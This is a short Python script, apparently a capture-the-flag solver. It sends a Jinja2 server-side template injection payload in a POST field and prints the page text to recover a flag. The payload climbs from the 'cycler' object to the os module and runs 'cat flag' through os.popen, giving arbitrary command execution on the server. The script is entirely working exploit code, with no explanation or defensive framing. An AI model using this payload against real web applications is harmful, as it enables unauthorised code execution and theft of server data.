import requests as r
from bs4 import BeautifulSoup as bs

payload = "{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}"
url = ""
data = {
    "content":payload
}
response = r.post(url,data)
soup = bs(response.text, 'html.parser')
flag = soup.get_text()
print(flag)